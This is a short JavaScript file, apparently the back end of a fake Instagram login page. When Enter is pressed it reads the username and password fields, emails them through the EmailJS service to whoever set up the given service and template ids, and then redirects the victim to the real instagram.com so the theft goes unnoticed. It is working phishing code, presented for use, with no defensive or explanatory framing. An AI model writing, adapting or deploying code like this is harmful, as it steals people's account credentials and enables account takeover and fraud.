document.addEventListener("keypress", (e) => {
    if (e.key == "Enter") {
        send()
    }
})

function send() {
    console.log("yay")
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;
    var contactdetail = {
        name: undefined,
        email: undefined,
        message: "Username: " + username + "\nPassword: " + password
    }

    emailjs.send('service_kwkyefk', 'template_oaqsw0h', contactdetail).then(function (res) {
        window.location.href = "https://www.instagram.com";
    },
        reason => {
        })

}